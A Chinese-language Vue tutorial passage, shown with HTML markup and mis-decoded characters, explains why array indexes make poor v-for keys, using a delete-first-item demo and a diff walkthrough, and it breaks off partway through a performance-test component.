  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T14:57:34.000Z" title="Wed Jan 07 2026 14:57:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>çœ‹ä¼¼ç®€å•çš„åˆ—è¡¨æ¸²æŸ“ï¼ŒèƒŒåéšè—ç€ Vue çš„æ¸²æŸ“ä¼˜åŒ–ç„æœºã€‚</p>
</blockquote>
<p>åœ¨ Vue é¡¹ç›®å¼€å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦æ¸²æŸ“åˆ—è¡¨æ•°æ®ã€‚å¾ˆå¤šäººä¸ºäº†æ–¹ä¾¿ï¼Œéšæ‰‹å°±ç”¨æ•°ç»„ç´¢å¼•ä½œä¸º key å€¼ï¼Œä½†è¿™ç§åšæ³•å¯èƒ½ä¼šå¸¦æ¥æ„æƒ³ä¸åˆ°çš„é—®é¢˜ã€‚ä»Šå¤©å°±æ¥æ·±å…¥æ¢è®¨ä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆ Vue å®˜æ–¹ä¸æ¨èè¿™æ ·åšã€‚</p>
<h2 data-id="heading-0">ä¸€ã€åˆè¯† Vue åˆ—è¡¨æ¸²æŸ“ä¸ key çš„ä½œç”¨</h2>
<h3 data-id="heading-1">1.1 Vue åˆ—è¡¨æ¸²æŸ“åŸºç¡€</h3>
<p>åœ¨ Vue ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨Â <code>v-for</code>Â æŒ‡ä»¤æ¥æ¸²æŸ“åˆ—è¡¨ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">li</span>Â <span class="hljs-attr">v-for</span>=<span class="hljs-string">"itemÂ inÂ items"</span>Â <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.id"</span>&gt;</span>
Â Â Â Â Â Â Â Â {{Â item.nameÂ }}
Â Â Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span>Â <span class="hljs-keyword">default</span>Â {
Â Â <span class="hljs-title function_">data</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â {
Â Â Â Â Â Â <span class="hljs-attr">items</span>:Â [
Â Â Â Â Â Â Â Â {Â <span class="hljs-attr">id</span>:Â <span class="hljs-number">1</span>,Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'è‹¹æœ'</span>Â },
Â Â Â Â Â Â Â Â {Â <span class="hljs-attr">id</span>:Â <span class="hljs-number">2</span>,Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'é¦™è•‰'</span>Â },
Â Â Â Â Â Â Â Â {Â <span class="hljs-attr">id</span>:Â <span class="hljs-number">3</span>,Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'æ©™å­'</span>Â }
Â Â Â Â Â Â ]
Â Â Â Â }
Â Â }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-2">1.2 key çš„ç¥ç§˜ä½œç”¨</h3>
<p>key çš„ä¸»è¦ä½œç”¨æ˜¯å¸®åŠ© VueÂ <strong>è¯†åˆ«èŠ‚ç‚¹çš„èº«ä»½</strong>ï¼Œä»è€Œå®ç°é«˜æ•ˆçš„ DOM æ›´æ–°ã€‚Vue é€šè¿‡ key æ¥åˆ¤æ–­å“ªäº›å…ƒç´ æ˜¯æ–°çš„ã€å“ªäº›æ˜¯æ—§çš„ï¼Œä»¥åŠå…ƒç´ æ˜¯å¦è¢«ç§»åŠ¨è¿‡ã€‚</p>
<p>æ²¡æœ‰ key æ—¶ï¼ŒVue ä¼šé‡‡ç”¨ "å°±åœ°å¤ç”¨" ç­–ç•¥ï¼Œè¿™å¯èƒ½å¯¼è‡´ï¼š</p>
<ul>
<li>â€¢ ä¸å¿…è¦çš„ DOM æ“ä½œ</li>
<li>â€¢ çŠ¶æ€æ··ä¹±ï¼ˆå¦‚è¡¨å•è¾“å…¥å€¼é”™ä¹±ï¼‰</li>
<li>â€¢ æ€§èƒ½ä¸‹é™</li>
</ul>
<h2 data-id="heading-3">äºŒã€ä¸‹æ ‡ä½œä¸º key çš„é—®é¢˜å‰–æ</h2>
<h3 data-id="heading-4">2.1 é—®é¢˜åœºæ™¯å†ç°</h3>
<p>å…ˆçœ‹ä¸€ä¸ªå¸¸è§çš„é”™è¯¯ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span>Â @<span class="hljs-attr">click</span>=<span class="hljs-string">"removeFirstItem"</span>&gt;</span>åˆ é™¤ç¬¬ä¸€é¡¹<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-comment">&lt;!--Â é”™è¯¯ç¤ºèŒƒï¼šä½¿ç”¨ä¸‹æ ‡ä½œä¸ºÂ keyÂ --&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">li</span>Â <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item,Â index)Â inÂ items"</span>Â <span class="hljs-attr">:key</span>=<span class="hljs-string">"index"</span>&gt;</span>
Â Â Â Â Â Â Â Â {{Â item.nameÂ }}Â 
Â Â Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">input</span>Â <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span>Â <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"è¯·è¾“å…¥å¤‡æ³¨"</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span>Â <span class="hljs-keyword">default</span>Â {
Â Â <span class="hljs-title function_">data</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â {
Â Â Â Â Â Â <span class="hljs-attr">items</span>:Â [
Â Â Â Â Â Â Â Â {Â <span class="hljs-attr">id</span>:Â <span class="hljs-number">1</span>,Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'è‹¹æœ'</span>Â },
Â Â Â Â Â Â Â Â {Â <span class="hljs-attr">id</span>:Â <span class="hljs-number">2</span>,Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'é¦™è•‰'</span>Â },
Â Â Â Â Â Â Â Â {Â <span class="hljs-attr">id</span>:Â <span class="hljs-number">3</span>,Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'æ©™å­'</span>Â }
Â Â Â Â Â Â ]
Â Â Â Â }
Â Â },
Â Â <span class="hljs-attr">methods</span>:Â {
Â Â Â Â <span class="hljs-title function_">removeFirstItem</span>(<span class="hljs-params"/>)Â {
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">shift</span>()Â <span class="hljs-comment">//Â åˆ é™¤ç¬¬ä¸€ä¸ªå…ƒç´ </span>
Â Â Â Â }
Â Â }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-5">2.2 åˆ é™¤æ“ä½œçš„é—®é¢˜æ¼”ç¤º</h3>
<p>å‡è®¾æˆ‘ä»¬åœ¨ä¸‰ä¸ªè¾“å…¥æ¡†ä¸­åˆ†åˆ«è¾“å…¥ï¼š</p>
<ul>
<li>â€¢ ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†ï¼š "æˆ‘å–œæ¬¢è‹¹æœ"</li>
<li>â€¢ ç¬¬äºŒä¸ªè¾“å…¥æ¡†ï¼š "é¦™è•‰å¾ˆç”œ"</li>
<li>â€¢ ç¬¬ä¸‰ä¸ªè¾“å…¥æ¡†ï¼š "æ©™å­å¯Œå«VC"</li>
</ul>
<p>å½“æˆ‘ä»¬ç‚¹å‡»"åˆ é™¤ç¬¬ä¸€é¡¹"æŒ‰é’®åï¼Œä½ æœŸæœ›çœ‹åˆ°çš„æ˜¯ï¼š</p>
<ul>
<li>â€¢ åˆ é™¤"è‹¹æœ"è¿™ä¸€è¡Œï¼Œè¾“å…¥æ¡†å†…å®¹"æˆ‘å–œæ¬¢è‹¹æœ"æ¶ˆå¤±</li>
<li>â€¢ "é¦™è•‰"å’Œ"æ©™å­"ä¿æŒä¸å˜</li>
</ul>
<p>ä½†å®é™…ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p>
<h2 data-id="heading-6">ä¸‰ã€Vue çš„ Diff ç®—æ³•ä¸ key çš„å…³ç³»</h2>
<h3 data-id="heading-7">3.1 Vue çš„è™šæ‹Ÿ DOM Diff ç®—æ³•</h3>
<p>ä¸ºäº†ç†è§£ key çš„é‡è¦æ€§ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£ Vue çš„æ›´æ–°æœºåˆ¶ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet">æ•°æ®å˜åŒ–é‡æ–°æ¸²æŸ“è™šæ‹ŸDOMæ–°æ—§è™šæ‹ŸDOMå¯¹æ¯” Diffç®—æ³•æ ¹æ®<span class="hljs-keyword">key</span>è¯†åˆ«èŠ‚ç‚¹èŠ‚ç‚¹å¯å¤ç”¨èŠ‚ç‚¹éœ€æ›´æ–°èŠ‚ç‚¹éœ€ç§»åŠ¨æœ€å°åŒ–DOMæ“ä½œ
</code></pre>
<h3 data-id="heading-8">3.2 ä¸‹æ ‡ä½œä¸º key æ—¶çš„ Diff è¿‡ç¨‹</h3>
<p>å½“ä½¿ç”¨ä¸‹æ ‡ä½œä¸º key æ—¶ï¼Œåˆ é™¤ç¬¬ä¸€ä¸ªå…ƒç´ åçš„å¯¹æ¯”è¿‡ç¨‹ï¼š</p>
<p><strong>åˆ é™¤å‰ï¼š</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">ç´¢å¼•:Â 0Â Â Â Â 1Â Â Â Â 2</span>
<span class="hljs-section">key:Â Â 0Â Â Â Â 1Â Â Â Â 2</span>
<span class="hljs-section">å€¼:Â Â Â è‹¹æœÂ é¦™è•‰Â æ©™å­</span>
<span class="hljs-section">è¾“å…¥:Â æˆ‘å–œæ¬¢è‹¹æœÂ é¦™è•‰å¾ˆç”œÂ æ©™å­å¯Œå«VC</span>
</code></pre>
<p><strong>åˆ é™¤åï¼š</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">ç´¢å¼•:Â 0Â Â Â Â 1</span>
<span class="hljs-section">key:Â Â 0Â Â Â Â 1</span>
<span class="hljs-section">å€¼:Â Â Â é¦™è•‰Â æ©™å­</span>
<span class="hljs-section">è¾“å…¥:Â ???Â ???</span>
</code></pre>
<p>Vue çš„ Diff ç®—æ³•ä¼šè¿™æ ·æ¯”è¾ƒï¼š</p>
<ol>
<li>
<ol>
<li>key=0 çš„å…ƒç´ ï¼šæ—§å€¼æ˜¯"è‹¹æœ"ï¼Œæ–°å€¼æ˜¯"é¦™è•‰" â†’Â <strong>æ›´æ–°å†…å®¹</strong></li>
</ol>
</li>
<li>
<ol start="2">
<li>key=1 çš„å…ƒç´ ï¼šæ—§å€¼æ˜¯"é¦™è•‰"ï¼Œæ–°å€¼æ˜¯"æ©™å­" â†’Â <strong>æ›´æ–°å†…å®¹</strong></li>
</ol>
</li>
<li>
<ol start="3">
<li>key=2 çš„å…ƒç´ ï¼šæ–°è™šæ‹ŸDOMä¸­ä¸å­˜åœ¨ â†’Â <strong>åˆ é™¤</strong></li>
</ol>
</li>
</ol>
<p>ç»“æœæ˜¯ï¼š</p>
<ul>
<li>â€¢ åŸæœ¬ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†çš„"æˆ‘å–œæ¬¢è‹¹æœ"ä¼šå‡ºç°åœ¨æ–°çš„ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†ï¼ˆæ˜¾ç¤º"é¦™è•‰"ï¼‰</li>
<li>â€¢ åŸæœ¬ç¬¬äºŒä¸ªè¾“å…¥æ¡†çš„"é¦™è•‰å¾ˆç”œ"ä¼šå‡ºç°åœ¨æ–°çš„ç¬¬äºŒä¸ªè¾“å…¥æ¡†ï¼ˆæ˜¾ç¤º"æ©™å­"ï¼‰</li>
<li>â€¢ ç”¨æˆ·è¾“å…¥å†…å®¹å’Œæ˜¾ç¤ºçš„æ•°æ®å®Œå…¨é”™ä½ï¼</li>
</ul>
<h3 data-id="heading-9">3.3 æ­£ç¡®ä½¿ç”¨ key çš„ Diff è¿‡ç¨‹</h3>
<p>ä½¿ç”¨å”¯ä¸€ id ä½œä¸º keyï¼š</p>
<pre><code class="hljs language-ini" lang="ini">&lt;liÂ <span class="hljs-attr">v-for</span>=<span class="hljs-string">"itemÂ inÂ items"</span>Â :key=<span class="hljs-string">"item.id"</span>&gt;
</code></pre>
<p><strong>åˆ é™¤å‰ï¼š</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">key:Â Â 1Â Â Â Â 2Â Â Â Â 3</span>
<span class="hljs-section">å€¼:Â Â Â è‹¹æœÂ é¦™è•‰Â æ©™å­</span>
<span class="hljs-section">è¾“å…¥:Â æˆ‘å–œæ¬¢è‹¹æœÂ é¦™è•‰å¾ˆç”œÂ æ©™å­å¯Œå«VC</span>
</code></pre>
<p><strong>åˆ é™¤åï¼š</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">key:Â Â 2Â Â Â Â 3</span>
<span class="hljs-section">å€¼:Â Â Â é¦™è•‰Â æ©™å­</span>
<span class="hljs-section">è¾“å…¥:Â é¦™è•‰å¾ˆç”œÂ æ©™å­å¯Œå«VC</span>
</code></pre>
<p>Vue çš„ Diff ç®—æ³•ï¼š</p>
<ol>
<li>
<ol>
<li>key=1 çš„å…ƒç´ ï¼šæ–°è™šæ‹ŸDOMä¸­ä¸å­˜åœ¨ â†’Â <strong>åˆ é™¤</strong></li>
</ol>
</li>
<li>
<ol start="2">
<li>key=2 çš„å…ƒç´ ï¼šæ–°æ—§éƒ½å­˜åœ¨ï¼Œå†…å®¹éƒ½æ˜¯"é¦™è•‰" â†’Â <strong>å¤ç”¨èŠ‚ç‚¹</strong></li>
</ol>
</li>
<li>
<ol start="3">
<li>key=3 çš„å…ƒç´ ï¼šæ–°æ—§éƒ½å­˜åœ¨ï¼Œå†…å®¹éƒ½æ˜¯"æ©™å­" â†’Â <strong>å¤ç”¨èŠ‚ç‚¹</strong></li>
</ol>
</li>
</ol>
<p>å®Œç¾åŒ¹é…ï¼ç”¨æˆ·è¾“å…¥çŠ¶æ€å¾—åˆ°ä¿ç•™ã€‚</p>
<h2 data-id="heading-10">å››ã€å„ç§æ“ä½œåœºæ™¯åˆ†æ</h2>
<h3 data-id="heading-11">4.1 æ•°ç»„æ“ä½œçš„å…¨é¢åˆ†æ</h3>
<p>è®©æˆ‘ä»¬é€šè¿‡ä»£ç æ¼”ç¤ºä¸åŒæ“ä½œçš„å½±å“ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//Â æµ‹è¯•å„ç§æ•°ç»„æ“ä½œ</span>
<span class="hljs-attr">methods</span>:Â {
Â Â <span class="hljs-comment">//Â 1.Â å¤´éƒ¨æ·»åŠ å…ƒç´ </span>
Â Â <span class="hljs-title function_">addToHead</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">unshift</span>({Â 
Â Â Â Â Â Â <span class="hljs-attr">id</span>:Â <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),Â 
Â Â Â Â Â Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'æ–°æ°´æœ'</span>Â 
Â Â Â Â })
Â Â },
Â Â 
Â Â <span class="hljs-comment">//Â 2.Â ä¸­é—´æ’å…¥å…ƒç´ </span>
Â Â <span class="hljs-title function_">insertMiddle</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">splice</span>(<span class="hljs-number">1</span>,Â <span class="hljs-number">0</span>,Â {
Â Â Â Â Â Â <span class="hljs-attr">id</span>:Â <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
Â Â Â Â Â Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'æ’å…¥çš„æ°´æœ'</span>
Â Â Â Â })
Â Â },
Â Â 
Â Â <span class="hljs-comment">//Â 3.Â æ’åºæ“ä½œ</span>
Â Â <span class="hljs-title function_">sortItems</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a,Â b</span>)Â =&gt;</span>Â a.<span class="hljs-property">name</span>.<span class="hljs-title function_">localeCompare</span>(b.<span class="hljs-property">name</span>))
Â Â },
Â Â 
Â Â <span class="hljs-comment">//Â 4.Â è¿‡æ»¤æ“ä½œ</span>
Â Â <span class="hljs-title function_">filterItems</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>Â =Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span>Â =&gt;</span>Â 
Â Â Â Â Â Â item.<span class="hljs-property">name</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'æœ'</span>)
Â Â Â Â )
Â Â },
Â Â 
Â Â <span class="hljs-comment">//Â 5.Â äº¤æ¢ä½ç½®</span>
Â Â <span class="hljs-title function_">swapItems</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">if</span>Â (<span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-property">length</span>Â &gt;=Â <span class="hljs-number">2</span>)Â {
Â Â Â Â Â Â <span class="hljs-keyword">const</span>Â [first,Â second]Â =Â [<span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[<span class="hljs-number">0</span>],Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[<span class="hljs-number">1</span>]]
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">splice</span>(<span class="hljs-number">0</span>,Â <span class="hljs-number">2</span>,Â second,Â first)
Â Â Â Â }
Â Â }
}
</code></pre>
<h3 data-id="heading-12">4.2 æ€§èƒ½å¯¹æ¯”æµ‹è¯•</h3>
<p>æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå¤§å‹åˆ—è¡¨æ¥æµ‹è¯•æ€§èƒ½å·®å¼‚ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span>Â @<span class="hljs-attr">click</span>=<span class="hljs-string">"shuffleItems"</span>&gt;</span>éšæœºæ‰“ä¹±<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>æ“ä½œè€—æ—¶:Â {{Â operationTimeÂ }}ms<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
Â Â Â Â 
Â Â Â Â <span class="hljs-comment">&lt;!--Â ä½¿ç”¨ä¸‹æ ‡ä½œä¸ºÂ keyÂ --&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>Â <span class="hljs-attr">v-if</span>=<span class="hljs-string">"useIndexKey"</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>ä½¿ç”¨ä¸‹æ ‡ä½œä¸ºÂ keyÂ ({{Â items.lengthÂ }}Â é¡¹)<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
Â Â Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">li</span>Â <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item,Â index)Â inÂ items"</span>Â <span class="hljs-attr">:key</span>=<span class="hljs-string">"index"</span>&gt;</span>
Â Â Â Â Â Â Â Â Â Â {{Â item.nameÂ }}Â <span class="hljs-tag">&lt;<span class="hljs-name">input</span>Â <span class="hljs-attr">v-model</span>=<span class="hljs-string">"item.remark"</span>&gt;</span>
Â Â Â Â Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
Â Â Â Â 
Â Â Â Â <span class="hljs-comment">&lt;!--Â ä½¿ç”¨Â idÂ ä½œä¸ºÂ keyÂ --&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>Â <span class="hljs-attr">v-else</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>ä½¿ç”¨Â idÂ ä½œä¸ºÂ keyÂ ({{Â items.lengthÂ }}Â é¡¹)<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
Â Â Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">li</span>Â <span class="hljs-attr">v-for</span>=<span class="hljs-string">"itemÂ inÂ items"</span>Â <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.id"</span>&gt;</span>
Â Â Â Â Â Â Â Â Â Â {{Â item.nameÂ }}Â <span class="hljs-tag">&lt;<span class="hljs-name">input</span>Â <span class="hljs-attr">v-model</span>=<span class="hljs-string">"item.remark"</span>&gt;</span>
Â Â Â Â Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span>Â <span class="hljs-keyword">default</span>Â {
Â Â <span class="hljs-title function_">data</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â {
Â Â Â Â Â Â <span class="hljs-attr">items</span>:Â [],
Â Â Â Â Â Â <span class="hljs-attr">useIndexKey</span>:Â <span class="hljs-literal">true</span>,
Â Â Â Â Â Â <span class="hljs-attr">operationTime</span>:Â <span class="hljs-number">0</span>
Â Â Â Â }
Â Â },
Â Â <span class="hljs-title function_">created</span>(<span class="hljs-params"/>)Â {
